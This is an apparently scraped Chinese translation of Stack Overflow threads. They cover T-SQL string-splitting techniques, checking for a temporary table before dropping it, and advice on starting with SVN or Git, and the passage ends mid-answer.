从**SQL Server 2016**开始，我们**使用 string_split**

```
DECLARE @string varchar(100) = 'Richard, Mike, Mark'

SELECT value FROM string_split(@string, ',') 
```

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2018-01-02T15:02:56.737

使用[STRING_SPLIT](https://docs.microsoft.com/en-us/sql/t-sql/functions/string-split-transact-sql)的现代方法需要 SQL Server 2016 及更高版本。

```
DECLARE @string varchar(100) = 'Hello John Smith'

SELECT
    ROW_NUMBER() OVER (ORDER BY value) AS RowNr,
    value
FROM string_split(@string, ' ') 
```

结果：

```
RowNr   value
1       Hello
2       John
3       Smith 
```

现在可以从行号中获取第 n 个元素。

* * *

## 回答 #33

> 赞同：0
> 
> 时间：2018-03-22T14:38:24.893

Aaron Bertrand 的回答很棒，但有缺陷。它不能准确地将空格作为分隔符处理（如原始问题中的示例），因为长度函数会去除尾随空格。

以下是他的代码，稍作调整以允许使用空格分隔符：

```
CREATE FUNCTION [dbo].[SplitString]
(
    @List NVARCHAR(MAX),
    @Delim VARCHAR(255)
)
RETURNS TABLE
AS
    RETURN ( SELECT [Value] FROM 
      ( 
        SELECT 
          [Value] = LTRIM(RTRIM(SUBSTRING(@List, [Number],
          CHARINDEX(@Delim, @List + @Delim, [Number]) - [Number])))
        FROM (SELECT Number = ROW_NUMBER() OVER (ORDER BY name)
          FROM sys.all_objects) AS x
          WHERE Number <= LEN(@List)
          AND SUBSTRING(@Delim + @List, [Number], LEN(@Delim+'x')-1) = @Delim
      ) AS y
    ); 
```

* * *

## 回答 #34

> 赞同：0
> 
> 时间：2018-04-26T21:16:34.290

这是一个函数，它将完成问题的拆分字符串和访问项目 X 的​​目标：

```
CREATE FUNCTION [dbo].[SplitString]
(
   @List       VARCHAR(MAX),
   @Delimiter  VARCHAR(255),
   @ElementNumber INT
)
RETURNS VARCHAR(MAX)
AS
BEGIN

       DECLARE @inp VARCHAR(MAX)
       SET @inp = (SELECT REPLACE(@List,@Delimiter,'_DELMTR_') FOR XML PATH(''))

       DECLARE @xml XML
       SET @xml = '<split><el>' + REPLACE(@inp,'_DELMTR_','</el><el>') + '</el></split>'

       DECLARE @ret VARCHAR(MAX)
       SET @ret = (SELECT
              el = split.el.value('.','varchar(max)')
       FROM  @xml.nodes('/split/el[string-length(.)>0][position() = sql:variable("@elementnumber")]') split(el))

       RETURN @ret

END 
```

用法：

```
SELECT dbo.SplitString('Hello John Smith', ' ', 2) 
```

结果：

```
John 
```

* * *

## 回答 #35

> 赞同：0
> 
> 时间：2018-08-20T18:59:23.500

**解析名字和姓氏的简单解决方案**

```
DECLARE @Name varchar(10) = 'John Smith'

-- Get First Name
SELECT SUBSTRING(@Name, 0, (SELECT CHARINDEX(' ', @Name)))

-- Get Last Name
SELECT SUBSTRING(@Name, (SELECT CHARINDEX(' ', @Name)) + 1, LEN(@Name)) 
```

在我的情况下（在许多其他情况下似乎......），我有一个由一个空格分隔的名字和姓氏的列表。这可以直接在 select 语句中使用来解析名字和姓氏。

```
-- i.e. Get First and Last Name from a table of Full Names
SELECT SUBSTRING(FullName, 0, (SELECT CHARINDEX(' ', FullName))) as FirstName,
SUBSTRING(FullName, (SELECT CHARINDEX(' ', FullName)) + 1, LEN(FullName)) as LastName,
From FullNameTable 
```

* * *

## 回答 #36

> 赞同：0
> 
> 时间：2018-09-17T21:07:09.293

我知道它很晚，但我最近有这个要求并想出了下面的代码。我没有选择使用用户定义的功能。希望这可以帮助。

```
SELECT 
    SUBSTRING(
                SUBSTRING('Hello John Smith' ,0,CHARINDEX(' ','Hello John Smith',CHARINDEX(' ','Hello John Smith')+1)
                        ),CHARINDEX(' ','Hello John Smith'),LEN('Hello John Smith')
            ) 
```

* * *

## 回答 #37

> 赞同：0
> 
> 时间：2021-05-06T10:55:55.343

```
CREATE TABLE test(
    id int,
    adress varchar(100)
);
INSERT INTO test VALUES(1, 'Ludovic Aubert, 42 rue de la Victoire, 75009, Paris, France'),(2, 'Jose Garcia, 1 Calle de la Victoria, 56500 Barcelona, Espana');

SELECT id, value, COUNT(*) OVER (PARTITION BY id) AS n, ROW_NUMBER() OVER (PARTITION BY id ORDER BY (SELECT NULL)) AS rn, adress
FROM test
CROSS APPLY STRING_SPLIT(adress, ',') 
```

[![在此处输入图像描述](../Images/09046a63ac0dc1ad561e3a7824568708.png)](https://i.stack.imgur.com/PZUGZ.png)

* * *

## 回答 #38

> 赞同：0
> 
> 时间：2022-02-03T11:17:46.520

@Aaron Bertrand 的修改功能

```
 CREATE FUNCTION [dbo].[SplitString]
(
    @List NVARCHAR(MAX),
    @Delim VARCHAR(255),
    @Idx int
)
RETURNS NVARCHAR(1000)
AS
BEGIN
    DECLARE @ValueTable TABLE(String NVARCHAR(50), Ind int)
    DECLARE @Value NVARCHAR(50)
    BEGIN
    INSERT INTO @ValueTable
    SELECT Value, idx FROM
        (SELECT [Value], idx = RANK() OVER (ORDER BY n) FROM 
              ( 
                SELECT n = Number, 
                [Value] = LTRIM(RTRIM(SUBSTRING(@List, [Number],
                CHARINDEX(@Delim, @List + @Delim, [Number]) - [Number])))
                FROM    
                        (SELECT Number = ROW_NUMBER() OVER (ORDER BY name)
                         FROM sys.all_objects) AS x
                WHERE Number <= LEN(@List)
                AND SUBSTRING(@Delim + @List, [Number], LEN(@Delim)) = @Delim
              ) AS y
          ) AS R WHERE idx = @Idx
    SET @Value = (SELECT String FROM @ValueTable)
    END
    RETURN @Value
END
GO 
```

* * *

## 回答 #39

> 赞同：-1
> 
> 时间：2008-08-05T18:36:15.923

好吧，我的并不是那么简单，但这是我用来将逗号分隔的输入变量拆分为单个值并将其放入表变量中的代码。我相信您可以稍微修改一下以根据空格进行拆分，然后对该表变量执行基本的 SELECT 查询以获得结果。

```
-- Create temporary table to parse the list of accounting cycles.
DECLARE @tblAccountingCycles table
(
    AccountingCycle varchar(10)
)

DECLARE @vchAccountingCycle varchar(10)
DECLARE @intPosition int

SET @vchAccountingCycleIDs = LTRIM(RTRIM(@vchAccountingCycleIDs)) + ','
SET @intPosition = CHARINDEX(',', @vchAccountingCycleIDs, 1)

IF REPLACE(@vchAccountingCycleIDs, ',', '') <> ''
BEGIN
    WHILE @intPosition > 0
    BEGIN
        SET @vchAccountingCycle = LTRIM(RTRIM(LEFT(@vchAccountingCycleIDs, @intPosition - 1)))
        IF @vchAccountingCycle <> ''
        BEGIN
            INSERT INTO @tblAccountingCycles (AccountingCycle) VALUES (@vchAccountingCycle)
        END
        SET @vchAccountingCycleIDs = RIGHT(@vchAccountingCycleIDs, LEN(@vchAccountingCycleIDs) - @intPosition)
        SET @intPosition = CHARINDEX(',', @vchAccountingCycleIDs, 1)
    END
END 
```

这个概念几乎相同。另一种选择是利用 SQL Server 2005 本身的 .NET 兼容性。您基本上可以在 .NET 中为自己编写一个简单的方法，该方法将拆分字符串，然后将其公开为存储过程/函数。

* * *

## 回答 #40

> 赞同：-1
> 
> 时间：2019-05-07T02:54:28.630

我意识到这是一个非常古老的问题，但从 SQL Server 2016 开始，有一些用于解析 JSON 数据的函数，可用于专门解决 OP 的问题——而无需拆分字符串或诉诸用户定义的函数。要访问分隔字符串的特定索引处的项目，请使用该`JSON_VALUE`函数。但是，需要正确格式化的 JSON 数据：字符串必须用双引号括起来`"`，分隔符必须是逗号`,`，整个字符串用方括号括起来`[]`。

```
DECLARE @SampleString NVARCHAR(MAX) = '"Hello John Smith"';
--Format as JSON data.
SET @SampleString = '[' + REPLACE(@SampleString, ' ', '","') + ']';
SELECT 
    JSON_VALUE(@SampleString, '$[0]') AS Element1Value,
    JSON_VALUE(@SampleString, '$[1]') AS Element2Value,
    JSON_VALUE(@SampleString, '$[2]') AS Element3Value; 
```

**输出**

```
Element1Value         Element2Value       Element3Value
--------------------- ------------------- ------------------------------
Hello                 John                Smith

(1 row affected) 
```

* * *

## 回答 #41

> 赞同：-1
> 
> 时间：2019-11-02T00:35:02.923

使用 SQL Server 2016 及更高版本。使用此代码修剪字符串，忽略 NULL 值并以正确的顺序应用行索引。它也适用于空格分隔符：

```
DECLARE @STRING_VALUE NVARCHAR(MAX) = 'one, two,,three, four,     five'

SELECT ROW_NUMBER() OVER (ORDER BY R.[index]) [index], R.[value] FROM
(
    SELECT
        1 [index], NULLIF(TRIM([value]), '') [value] FROM STRING_SPLIT(@STRING_VALUE, ',') T
    WHERE
        NULLIF(TRIM([value]), '') IS NOT NULL
) R 
```

* * *

## 回答 #42

> 赞同：-1
> 
> 时间：2020-02-22T15:17:46.880

如果您查看以下关于[使用 SQL 拆分字符串](http://www.kodyaz.com/t-sql/scalar-and-tablue-valued-user-defined-sql-split-function.aspx)的 SQL 教程，您会发现许多可用于在 SQL Server 上拆分给定字符串的函数

例如，**SplitAndReturnNth** UDF 函数可用于使用分隔符拆分文本并返回第 N 段作为函数的输出

```
select dbo.SplitAndReturnNth('Hello John Smith',' ',2) 
```

[![在此处输入图像描述](../Images/c99547fb05b4396590fd7fbda9ba56cc.png)](https://i.stack.imgur.com/2jEe1.png)

* * *

## 回答 #43

> 赞同：-2
> 
> 时间：2013-06-19T23:42:16.843

这是我的解决方案，可以帮助某人。上面对 Jonesinator 答案的修改。

如果我有一串分隔的 INT 值并希望返回一个 INT 表（然后我可以加入）。例如'1,20,3,343,44,6,8765'

创建一个 UDF：

```
IF OBJECT_ID(N'dbo.ufn_GetIntTableFromDelimitedList', N'TF') IS NOT NULL
    DROP FUNCTION dbo.[ufn_GetIntTableFromDelimitedList];
GO

CREATE FUNCTION dbo.[ufn_GetIntTableFromDelimitedList](@String NVARCHAR(MAX),                 @Delimiter CHAR(1))

RETURNS @table TABLE 
(
    Value INT NOT NULL
)
AS 
BEGIN
DECLARE @Pattern NVARCHAR(3)
SET @Pattern = '%' + @Delimiter + '%'
DECLARE @Value NVARCHAR(MAX)

WHILE LEN(@String) > 0
    BEGIN
        IF PATINDEX(@Pattern, @String) > 0
        BEGIN
            SET @Value = SUBSTRING(@String, 0, PATINDEX(@Pattern, @String))
            INSERT INTO @table (Value) VALUES (@Value)

            SET @String = SUBSTRING(@String, LEN(@Value + @Delimiter) + 1, LEN(@String))
        END
        ELSE
        BEGIN
            -- Just the one value.
            INSERT INTO @table (Value) VALUES (@String)
            RETURN
        END
    END

RETURN
END
GO 
```

然后得到表格结果：

```
SELECT * FROM dbo.[ufn_GetIntTableFromDelimitedList]('1,20,3,343,44,6,8765', ',')

1
20
3
343
44
6
8765 
```

在 join 语句中：

```
SELECT [ID], [FirstName]
FROM [User] u
JOIN dbo.[ufn_GetIntTableFromDelimitedList]('1,20,3,343,44,6,8765', ',') t ON u.[ID] = t.[Value]

1    Elvis
20   Karen
3    David
343  Simon
44   Raj
6    Mike
8765 Richard 
```

如果要返回 NVARCHAR 列表而不是 INT 列表，则只需更改表定义：

```
RETURNS @table TABLE 
(
    Value NVARCHAR(MAX) NOT NULL
) 
```

* * *

## 回答 #44

> 赞同：-2
> 
> 时间：2014-03-20T14:41:07.800

这是一个 SQL UDF，它可以拆分字符串并仅抓取某个片段。

```
create FUNCTION [dbo].[udf_SplitParseOut]
(
    @List nvarchar(MAX),
    @SplitOn nvarchar(5),
    @GetIndex smallint
)  
returns varchar(1000)
AS  

BEGIN

DECLARE @RtnValue table 
(

    Id int identity(0,1),
    Value nvarchar(MAX)
) 

    DECLARE @result varchar(1000)

    While (Charindex(@SplitOn,@List)>0)
    Begin
        Insert Into @RtnValue (value)
        Select Value = ltrim(rtrim(Substring(@List,1,Charindex(@SplitOn,@List)-1)))
        Set @List = Substring(@List,Charindex(@SplitOn,@List)+len(@SplitOn),len(@List))
    End

    Insert Into @RtnValue (Value)
    Select Value = ltrim(rtrim(@List))

    select @result = value from @RtnValue where ID = @GetIndex

    Return @result
END 
```

* * *

## 回答 #45

> 赞同：-2
> 
> 时间：2014-05-01T06:26:39.047

一个简单的优化算法：

```
ALTER FUNCTION [dbo].[Split]( @Text NVARCHAR(200),@Splitor CHAR(1) )
RETURNS @Result TABLE ( value NVARCHAR(50)) 
AS
BEGIN
    DECLARE @PathInd INT
    Set @Text+=@Splitor
    WHILE LEN(@Text) > 0
    BEGIN
        SET @PathInd=PATINDEX('%'+@Splitor+'%',@Text)
        INSERT INTO  @Result VALUES(SUBSTRING(@Text, 0, @PathInd))
        SET @Text= SUBSTRING(@Text, @PathInd+1, LEN(@Text))
    END
        RETURN 
END 
```

* * *

## 回答 #46

> 赞同：-2
> 
> 时间：2014-08-19T19:45:33.960

我一直在使用 vzczc's answer using recursive cte's 一段时间，但我想更新它以处理可变长度分隔符，并处理带有前导和滞后“分隔符”的字符串，例如当你有一个带有记录的 csv 文件时：

**“鲍勃”、“史密斯”、“桑尼维尔”、“加利福尼亚州”**

或者当您处理如下所示的六部分 fqn 时。我将这些广泛用于记录 subject_fqn 以进行审计、错误处理等，而 parsename 仅处理四个部分：

```
[netbios_name].[machine_name].[instance].[database].[schema].[table].[column] 
```

这是我的更新版本，感谢 vzczc 的原始帖子！

```
select * from [utility].[split_string](N'"this"."string"."gets"."split"."and"."removes"."leading"."and"."trailing"."quotes"', N'"."', N'"', N'"');

select * from [utility].[split_string](N'"this"."string"."gets"."split"."but"."leaves"."leading"."and"."trailing"."quotes"', N'"."', null, null);

select * from [utility].[split_string](N'[netbios_name].[machine_name].[instance].[database].[schema].[table].[column]', N'].[', N'[', N']');

create function [utility].[split_string] ( 
  @input       [nvarchar](max) 
  , @separator [sysname] 
  , @lead      [sysname] 
  , @lag       [sysname]) 
returns @node_list table ( 
  [index]  [int] 
  , [node] [nvarchar](max)) 
  begin 
      declare @separator_length [int]= len(@separator) 
              , @lead_length    [int] = isnull(len(@lead), 0) 
              , @lag_length     [int] = isnull(len(@lag), 0); 
      -- 
      set @input = right(@input, len(@input) - @lead_length); 
      set @input = left(@input, len(@input) - @lag_length); 
      -- 
      with [splitter]([index], [starting_position], [start_location]) 
           as (select cast(@separator_length as [bigint]) 
                      , cast(1 as [bigint]) 
                      , charindex(@separator, @input) 
               union all 
               select [index] + 1 
                      , [start_location] + @separator_length 
                      , charindex(@separator, @input, [start_location] + @separator_length) 
               from   [splitter] 
               where  [start_location] > 0) 
      -- 
      insert into @node_list 
                  ([index],[node]) 
        select [index] - @separator_length                   as [index] 
               , substring(@input, [starting_position], case 
                                                            when [start_location] > 0 
                                                                then 
                                                              [start_location] - [starting_position] 
                                                            else 
                                                              len(@input) 
                                                        end) as [node] 
        from   [splitter]; 
      -- 
      return; 
  end; 
go 
```**

# sql-server - 确定 SQL Server 中是否存在临时表的最佳方法是什么？

> ID：2649
> 
> 赞同：21
> 
> 时间：2008-08-05T18:18:39.373
> 
> 标签：sql-server

在编写我计划重新运行的 T-SQL 脚本时，我经常使用临时表来存储临时数据。由于临时表是动态创建的，因此我希望仅在该表存在时才能删除该表（在我创建它之前）。

我将发布我使用的方法，但我想看看是否有更好的方法。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2008-08-05T18:21:38.730

```
IF Object_Id('TempDB..#TempTable') IS NOT NULL
BEGIN
    DROP TABLE #TempTable
END 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-08-05T18:21:31.537

OBJECT_ID 函数返回给定对象名称和类型的内部对象 ID。'tempdb..#t1' 指的是 tempdb 数据库中的表 #t1。'U' 用于用户定义的表。

```
IF OBJECT_ID('tempdb..#t1', 'U') IS NOT NULL
  DROP TABLE #t1

CREATE TABLE #t1
(
  id INT IDENTITY(1,1),
  msg VARCHAR(255)
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:50:20.867

```
SELECT name
FROM sysobjects
WHERE type = 'U' AND name = 'TempTable' 
```

# git - 开始使用版本控制系统

> ID：2658
> 
> 赞同：76
> 
> 时间：2008-08-05T18:29:14.283
> 
> 标签：git, svn, version-control, language-agnostic, dvcs

我需要实施版本控制，即使只是我在家里做的开发。在过去的几年里，我读到了关于颠覆是多么伟大的文章，并且正准备专注于学习这一点，直到我听说 Git 是即将到来的版本控制系统。

鉴于这种情况，我应该推迟一下，看看哪个排在首位？它们的相对优势是什么？

我注意到 Git 的一个问题是，功能齐全的 GUI 并不多，这对我团队中的许多用户很重要。

此外，不介意关于如何开始使用其中一种的建议。（教程等）

* * *

## 回答 #1

> 赞同：82
> 
> 时间：2008-08-05T18:34:44.350

版本控制最重要的是：

***开始使用吧***

不使用版本控制是一个可怕的想法。如果您没有使用版本控制，请立即停止阅读并开始使用它。

很容易从

```
cvs<->svn<->git<->hg 
```

你选择哪一个并不重要。只需选择最容易使用的一个并开始记录您的代码历史。您以后可以随时迁移到另一个 (D)VCS。

如果您正在寻找易于使用的 GUI，请查看[TortoiseSVN (Windows)](http://tortoisesvn.tigris.org/%22TortoiseSVN%22)和[版本 (Mac)](http://www.versionsapp.com/)（由[codingwithoutcomments](https://stackoverflow.com/questions/2658?sort=newest#2708)建议）

* * *

编辑：

> [pix0r 说：](https://stackoverflow.com/questions/2658/#2672)
> 
> Git 有一些不错的功能，但除非您已经使用过像 CVS 或 Subversion 这样更标准的东西，否则您将无法欣赏它们。

这。如果您不知道版本控制可以为您做什么，那么使用 git 毫无意义。

编辑2：

刚刚在 reddit 上看到了这个链接：[Subversion Cheat Sheet](http://www.addedbytes.com/cheat-sheets/subversion-cheat-sheet/)。svn 命令行的快速参考。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2008-08-05T18:31:56.773

使用颠覆，它易于设置，易于使用，并且具有大量工具。任何未来的修订系统都将具有从 SVN 功能导入的功能，因此如果您的需求增长，您就不能在未来进行更改。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2008-08-05T18:36:48.370

[Subversion Book](http://svnbook.red-bean.com/)是您学习该工具的最佳选择。那里可能还有其他快速入门教程，但本书是您能找到的最好的单一参考。

Git 有一些不错的功能，但除非您已经使用过像 CVS 或 Subversion 这样更标准的东西，否则您将无法欣赏它们。我肯定会同意以前的海报并从 Subversion 开始。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2008-08-14T07:42:38.540

如果您不熟悉版本控制，请阅读以下内容：
[Source Control HOWTO](http://www.ericsink.com/scm/source_control.html)

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2008-08-05T18:33:56.927

去SVN。如果您以前从未使用过源代码控制，那么无论哪种方式对您来说都无关紧要。

此外，使用源代码控制系统并不涉及大量学习。如果你学会了一个，你可以在以后轻松地切换到另一个。

SVN 是一个很棒的工具，它应该可以满足您的大部分需求。而且由于它已经存在，它拥有相当多的 GUI 工具（例如 TortoiseSVN）。

去SVN。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2008-08-05T18:39:23.310

有关大多数基本概念的友好解释，请参阅[版本控制可视化指南](http://betterexplained.com/articles/a-visual-guide-to-version-control/ "更好的解释：版本控制的可视化指南")。这篇文章对 SVN 非常友好。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2008-08-14T06:21:33.197

我使用过 RCS、CVS、SCCS、SourceSafe、Vault、perforce、subversion 和 git。

我评估过 BitKeeper、Dimensions、arch、bazaar、svk、ClearCase、PVCS 和 Synergy。

如果我今天必须启动一个新的存储库，我会选择**git**。把手放下。

它是免费的、快速的，并且正在积极开发中。

您可以使用 git-svn 将其用作任何 subversion 存储库的客户端。

它摇摆不定。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2008-08-14T07:00:50.370

> @superjoe30
> 
> 如果您是唯一的程序员，那么在您自己的计算机上使用源代码控制怎么样？这是好习惯吗？有相关的提示或技巧吗？

我发现 git 实际上更容易做到这一点，因为您不需要服务器或担心输入 URL 等等。您的版本控制内容只存在于`.git`项目内的目录中，您只需继续使用它即可。

5 秒介绍（假设您已安装它）

```
cd myproject
git init
git add * # add all the files
git commit 
```

下次你做一些改变

```
git add newfile1 newfile2 # if you've made any new files since last time
git commit -a 
```

只要你这样做，git就会支持你。如果你搞砸了，你的代码在漂亮的 git 存储库中是安全的。这很棒

*   注意：你可能会发现从 git 中取出东西比把它们放进去要困难一些，但有这个问题比根本没有文件要好得多！

* * *

## 回答 #9

> 赞同：5
> 
> 时间：2008-09-23T09:32:14.163

根据我自己的经验，我不推荐 git 作为版本控制的介绍。我已经使用它几个月了，我的印象是它非常强大，而且——现在我已经部分理解了它——相当直观。然而，学习曲线非常陡峭，尽管我多年来一直在使用版本控制。它还存在表现力太强的问题——它支持许多不同的工作流程和开发模型，但关于“最佳”使用方式的唯一指导是在谷歌搜索中深入几页，这也让新手很难选择向上。

也就是说，从 git 的空白开始实际上可能会更容易——我的 VCS 经验都是集中式版本控制（CVS、SVN、Perforce ...），而我（持续！）使用 git 的部分困难是理解分布式模型的含义。我确实瞥了一眼其他 DVCS，例如 Bazaar 和 Mercurial，它们似乎对新手更加友好。

无论如何，正如其他人所说，Subversion 可能是习惯版本控制思维和获得 VCS 好处（回滚、分支、协作开发、更轻松的代码审查等）的实践经验的最简单方法。

哦，不要从 CVS 开始。它仍在实际使用中，并且具有优势，但恕我直言，它有太多的历史怪癖和实现问题（非原子提交！），不是一个很好的学习方式。

* * *

## 回答 #10

> 赞同：4
> 
> 时间：2008-08-05T18:39:20.597

我的投票投给了颠覆。它非常强大，但易于使用，并且有一些很棒的工具，比如[TortoiseSVN](http://tortoisesvn.tigris.org/)。

但正如其他人在我之前所说的，刚开始使用它。源代码控制是软件开发过程的重要组成部分。任何“严肃的”软件项目都不应该没有它。

* * *

## 回答 #11

> 赞同：4
> 
> 时间：2008-08-05T19:18:37.477

在我目前的工作中，我的前任没有使用任何类型的版本控制。在他保存所有项目的至少 3 个不同的地方，只有堆积如山的文件夹。任何随机项目文件夹都可以预期找到至少一个文件夹名称“project (OLD)”和一个名为“project”的文件夹

使用版本控制，您永远不必复制“安全”构建。您不必担心您的 IDE 会损坏您正在处理的文件（我在看着您，REALBasic 5.5），因为每天都可以轻松提交（阅读：保存）您的工作。

不用说，我在发现它存在的第二天就安装了版本控制。

此外，TortoiseSVN 使提交到数据库就像右键单击文件夹一样简单。

* * *

## 回答 #12

> 赞同：4
> 
> 时间：2008-08-06T18:59:40.167

如果您想避免任何命令行工作，也可以为您的服务器尝试[视觉 svn 。](http://www.visualsvn.com/)

* * *

## 回答 #13

> 赞同：3
> 
> 时间：2008-08-05T19:01:55.200

如果您使用的是 Mac OSX，我发现 http://www.versionsapp.com/">Versions 是 SVN 的一个令人难以置信的（免费）GUI 前端。

* * *

## 回答 #14

> 赞同：3
> 
> 时间：2008-08-22T18:38:37.000

Git 优于颠覆，但它有点处于最前沿。

我想说，如果你才刚刚开始，那就跳到边缘；设置一个免费帐户@http: [//github.com](http://github.com)

他们在网站上有用于设置和使用 git 的教育材料。

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2008-08-05T18:35:27.890

不要等待。选一个，随它去吧。所有系统都有其优点和缺点。您的电源可能会断电，您的计算机被盗，或者您忘记撤消重大更改，并且在您等待看谁获胜时，您的所有代码都会被烧毁。

* * *

## 回答 #16

> 赞同：2
> 
> 时间：2008-08-05T23:20:03.510

在版本控制系统之间切换并不难。正如其他人所提到的，重要的是尽快开始使用任何东西。使用源代码控制相对于不使用源代码控制的好处远远超过了不同类型的源代码控制之间的差异优势。

请记住，无论您使用什么版本的源代码控制，您都可以通过将旧系统中的文件放到磁盘上然后将这些原始文件导入新系统来对另一个系统进行暴力转换。

此外，熟悉源代码控制基础知识对于软件开发人员来说是一项非常非常重要的技能。

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2008-08-05T18:40:30.937

是的，除非您真的需要 git 的特定功能，否则首选 SVN。SVN 已经够难了；听起来 git 更复杂。[你可以从像Beanstalk](http://www.beanstalkapp.com/)这样的人那里获得托管的 svn - 除非你有内部 Linux 人员，否则我真的会推荐它。事情很容易出错，很高兴有其他人负责修复它。

Eric Sink 提供了一个关于修订控制的优秀[教程](http://www.ericsink.com/scm/source_control.html)，无论您使用哪种系统，都值得一读。

* * *

## 回答 #18

> 赞同：1
> 
> 时间：2008-08-22T18:42:41.403

使用 TortoiseSVN（如果在 mac 上，则为 version.app）。只需安装即可。如果您需要一个地方来托管您的代码，请查看[http://beanstalkapp.com/](http://beanstalkapp.com/)

* * *

## 回答 #19

> 赞同：1
> 
> 时间：2008-08-25T14:52:48.733

Coding Horror 有一篇关于[如何在 Windows 上设置 Subversion](https://blog.codinghorror.com/setting-up-subversion-on-windows/)的精彩帖子。

按照教程，我能够让 Subervsion 和 TortoiseSVN 在本地运行，并从中获得了所需的教育。

就 Git 而言，对它们进行动手实验可能是个好主意，以了解哪种适合您的特定开发实践。

* * *

## 回答 #20

> 赞同：1
> 
> 时间：2008-09-23T06:50:43.133

SubVersion 是您的最佳选择，正如 Karl Seguin 指出的那样，迁移到另一个版本控制系统不会有问题。SVN 在客户端 (TortoiseSVN) 中也有非常容易使用的 GUI。

[http://www.snee.com/bobdc.blog/2007/08/getting_started_with_subversio.html](http://www.snee.com/bobdc.blog/2007/08/getting_started_with_subversio.html) [http://dojo.jot.com/WikiHome/Getting%20Started%20With%20Subversion](http://dojo.jot.com/WikiHome/Getting%20Started%20With%20Subversion)

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2008-09-23T08:46:06.227

如果您选择使用 subversion 并且想要托管自己的 svn 服务器，那么有一个非常好用且简单的基于 Windows 的服务器，称为 VisualSVN 服务器。它隐藏了设置 apache 服务器的复杂性，您基本上只需 next next next。用户配置由 webUI 处理，而不是配置

[http://www.visualsvn.com/server/](http://www.visualsvn.com/server/)

使用公共服务 rlike beanstalk 可能更容易，但有些人喜欢拥有自己的存储库，无论是为了速度还是安全

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2008-08-05T18:36:01.227

当我决定必须使用代码版本控制系统时，我四处寻找有关如何入门的好教程，但没有找到任何可以帮助我的教程。

所以我简单地为客户端安装了 SVN Server 和 Tortoise SVN 并深入研究了它，但我一直不知道如何使用它。

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2008-08-05T18:38:00.973

开始在实际工作中使用 SVN，但尽量腾出时间来摆弄 Git 和/或 Mercurial。SVN 对于生产来说相当稳定，但最终您将面临*需要*分布式 SCM 的情况，到那时您将正确武装并且新系统将足够成熟。

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2008-08-05T18:41:38.797

> [superjoe30 写道](https://stackoverflow.com/questions/2658/#2674)：
> 
> > 相关问题（也许也可以编辑答案来回答这个问题）：
> > 
> > 如果您是唯一的程序员，那么在您自己的计算机上使用源代码控制怎么样？>>这是好习惯吗？有相关的提示或技巧吗？

我将 SVN 用于我所有的个人项目。我开始在我的家用机器上运行 svn，但最终迁移到了 Dreamhost。他们包含 Subversion 的托管软件包非常合理。

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2008-08-07T17:33:30.573

如果在 Windows 盒子上，一个快速而肮脏的解决方案是 CVSNT。易于使用，只需设置它并且效果很好。

我自己更喜欢 SVN，但这是一个快速使用的好方法。

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2008-08-17T01:25:05.977

我肯定会选择 SVN 而不是 CVS，如果仅仅是因为使用 CVS 学习源代码控制的人倾向于使用“ `svn delete`”然后“ `svn add`”而不是“ `svn move`”。这使得查找特定文件的所有先前版本变得更加困难。你可以随时升级到使用 git-svn。我个人认为它比 hg 更容易学习，但真正使用 SVN 的**主要原因**是它在很大程度上已成为开源软件事实上的版本控制系统。

如果您计划学习/使用[D](http://www.digitalmars.com/d/)，那么访问第三方存储库几乎是强制性的，例如[DSource](http://dsource.org)。

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2008-08-18T08:17:01.603

@superjoe30 是的，绝对的。一旦你开始使用版本控制，你就再也回不去了。我将它用于所有内容，甚至是我的“主”文件夹。

@Orion Edwards Subversion 不需要服务器。您可以直接访问本地存储库（当然，通过客户端），并且不涉及服务器进程。

* * *

## 回答 #28

> 赞同：0
> 
> 时间：2008-08-18T14:47:18.493

只需使用 TortoiseSVN，即使不知道实际的 Subversion 命令也可以生活……但这很糟糕。幸运的是，总会有一个“很好的机会”来背诵它们——当你无价的存储库第一次被破坏时。

是的，它发生了。

* * *

## 回答 #29

> 赞同：0
> 
> 时间：2008-08-22T18:30:30.763

正如在其他地方多次提到的，Just Do It。通过阅读红皮书中的快速入门指南，我能够立即在 Windows 下从头开始使用 Subversion。一旦我将 TortoiseSVN 指向存储库，我就开始做生意了。我花了一段时间才把更好的分数拿下来，但他们只是克服了一些小问题。

我建议安装 Subversion 服务而不是使用 file:// URL，但这主要是个人喜好。对于存储在您的开发机器上的存储库，file:// 可以正常工作。

* * *

## 回答 #30

> 赞同：0
> 
> 时间：2008-08-22T18:42:50.937

从个人经验来看，svn 将是我的推荐。您甚至可以使用像[Beanstalk](http://beanstalkapp.com/)这样提供免费帐户的服务（显然有限制，但对于任何小型项目来说都足够了）来试水。但正如其他人所说，git 更优越，可能值得研究。

* * *

## 回答 #31

> 赞同：0
> 
> 时间：2008-08-30T16:30:14.933

现在简化 SVN 服务器设置的一个主要技巧是使用虚拟设备。也就是说，一个预先安装和（大部分）预先配置了颠覆的虚拟机 - 几乎是即插即用的东西。您可以[在这里](http://www.vmware.com/appliances/directory/519)、[这里](http://www.ytechie.com/svn-vm)和[这里](http://www.garghouti.co.uk/vmTrac/)尝试，或者尝试在 Google 上搜索“颠覆虚拟设备”。

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2008-09-02T09:35:40.787

在阅读了 Wil Shipley 的博客后，我开始使用 subversion。

所以我开始检查代码，一台机器和dreamhost帐户。然后在我不小心删除了一个函数并保存了我的项目后，我知道我陷入了“dudu”的深渊，但是通过颠覆，我刚刚检查了该文件的最新版本，就像什么都没发生一样。

我现在对所有内容都使用版本控制。我正计划转移到 git，因为它更快，离线工作，占用更少空间，哦，天哪，它更快。

* * *

## 回答 #33

> 赞同：0
> 
